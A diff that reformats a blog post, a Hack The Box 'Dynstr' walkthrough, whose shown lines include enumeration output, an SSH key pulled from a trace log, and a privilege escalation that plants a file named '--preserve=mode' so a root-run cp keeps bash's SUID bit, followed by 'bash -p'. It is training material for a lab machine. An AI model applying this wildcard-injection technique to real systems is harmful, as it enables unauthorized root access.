@@ -1,24 +1,26 @@
 ---
-date: 2021-10-16 16:00:00
-images: 
-- https://i.imgur.com/89b1SdH.png
+title: 'Walktrough: HTB Dynstr'
 language: en-US
 localeid: htb-dynstr
+date: 2021-10-16T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Medium
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Dynstr'
-authors: ['default']
+  - HackTheBox
+  - HTB Medium
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/89b1SdH.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Dynstr**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [jkr](https://app.hackthebox.eu/users/77141).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB Dynstr](https://i.imgur.com/kqW8fwk.png)
 
@@ -67,9 +69,9 @@ Besides a single-page application, this website contains especially useful infor
 
 ![HTB Dynstr - Dyna DNS Services](https://i.imgur.com/QZvDDXJ.png)
 
-- Application for DNS registration uses the same API as `no-ip.com`, as available in their documentation at [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
-- The domains that could be used for this service are listed, which were later added to the local hosts file.
-- Demo credentials were provided, so we can start playing with the API :smile:
+* Application for DNS registration uses the same API as `no-ip.com`, as available in their documentation at [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
+* The domains that could be used for this service are listed, which were later added to the local hosts file.
+* Demo credentials were provided, so we can start playing with the API \:smile:
 
 #### Interacting with the API
 
@@ -214,7 +216,7 @@ Authorization: Basic ZHluYWRuczpzbmRhbnlk
 
 Started enumeration using the obtained account `www-data`, default for apache, using `linpeas.sh`, where the following items were identified:
 
-- Users with console and their permissions:
+* Users with console and their permissions:
 
 ```plaintext
 uid=0(root) gid=0(root) groups=0(root)
@@ -222,7 +224,7 @@ uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip
 uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
 ```
 
-- Ability to list files inside others home directories, where we can see some SSH Keys for `bindmgr` account
+* Ability to list files inside others home directories, where we can see some SSH Keys for `bindmgr` account
 
 ```plaintext
 ╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
@@ -243,7 +245,7 @@ uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
 /home/dyna/.sudo_as_admin_successful
 ```
 
-  Checking the contents of `/home/bindmgr`, we can see the `user.txt` file but we have no read rights on it. In this user's profile, there's also a folder called `support-case-C62796521`, which contains some debugging/tracing output from some tasks executed in the server.
+Checking the contents of `/home/bindmgr`, we can see the `user.txt` file but we have no read rights on it. In this user's profile, there's also a folder called `support-case-C62796521`, which contains some debugging/tracing output from some tasks executed in the server.
 
 ```bash
 www-data@dynstr:/var/www$ ls -la /home/bindmgr/
@@ -261,7 +263,7 @@ drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
 www-data@dynstr:/var/www$
 ```
 
-  After analyzing the files, noticed that in `strace-C62796521.txt` we have the private key in plain text, which was extracted and saved as an `id_rsa` file.
+After analyzing the files, noticed that in `strace-C62796521.txt` we have the private key in plain text, which was extracted and saved as an `id_rsa` file.
 
 ```plaintext
 [...]
@@ -356,7 +358,7 @@ User bindmgr may run the following commands on dynstr:
 bindmgr@dynstr:~
 ```
 
-Checking its content, noticed one interesting entry in **line 42**, where the script, running as `root`, copies the file `.version` and all other existing files in the current directory (`*`) to $BINDMGR_DIR. Also, it requires a `.version` file in the current directory to be compared with the existing configuration in the server.
+Checking its content, noticed one interesting entry in **line 42**, where the script, running as `root`, copies the file `.version` and all other existing files in the current directory (`*`) to $BINDMGR\_DIR. Also, it requires a `.version` file in the current directory to be compared with the existing configuration in the server.
 
 ```bash
 # Stage new version of configuration files.
@@ -383,7 +385,7 @@ drwxr-sr-x 3 root bind 4096 Aug 16 18:22 ..
 -rw-r--r-- 1 root bind    2 Aug 16 18:22 .version
 ```
 
-Checking the [cp \| GTFOBins](https://gtfobins.github.io/gtfobins/cp/#suid) for SUID, noticed that if `cp` has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of `cp` in this script.
+Checking the [cp | GTFOBins](https://gtfobins.github.io/gtfobins/cp/#suid) for SUID, noticed that if `cp` has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of `cp` in this script.
 
 One point seen in the page mentioned above is that we could use the parameter `--preserve` to **preserve file attributes** during the copy. Appending this parameter to execution could be achieved thanks to a `bash` feature called **filename expansion**, popularly known as ***[globbing](https://tldp.org/LDP/abs/html/globbingref.html)*** which **expands** the names of the files during command execution.  This behavior can be seen in the example below with `echo`:
 
@@ -400,7 +402,7 @@ This could be exploited as we could also abuse that during `cp` execution, copyi
 
 This was achieved by running the steps below:
 
-- Copied `/bin/bash` to a working temp directory and changed its permissions, setting its SUID bit and creating the `.version` file.
+* Copied `/bin/bash` to a working temp directory and changed its permissions, setting its SUID bit and creating the `.version` file.
 
 ```bash
 bindmgr@dynstr:/tmp$ cd $(mktemp -d)
@@ -415,7 +417,7 @@ drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
 -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
 ```
 
-- Created a file called `--preserve=mode`, so its name could be expanded as a parameter for `cp` during script execution, copying `bash` as root but keeping SUID set. We can confirm that as well using `echo`, also below
+* Created a file called `--preserve=mode`, so its name could be expanded as a parameter for `cp` during script execution, copying `bash` as root but keeping SUID set. We can confirm that as well using `echo`, also below
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
@@ -423,7 +425,7 @@ bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
 bash --preserve=mode
 ```
 
-- Ran the script using `sudo`
+* Ran the script using `sudo`
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
@@ -439,7 +441,7 @@ sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
     /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
 ```
 
-- Executed the `bash` binary with `-p` parameter, as stated in [bash \| GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), giving me an interactive shell as `root` and able to read contents of `/root/root.txt` file :smiley:
+* Executed the `bash` binary with `-p` parameter, as stated in [bash | GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), giving me an interactive shell as `root` and able to read contents of `/root/root.txt` file \:smiley:
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ /etc/bind/named.bindmgr/bash -p
@@ -457,4 +459,4 @@ bash-5.0# cat root.txt
 
 I hope you guys have enjoyed it!
 
-See you at the next post :smile:
+See you at the next post \:smile:
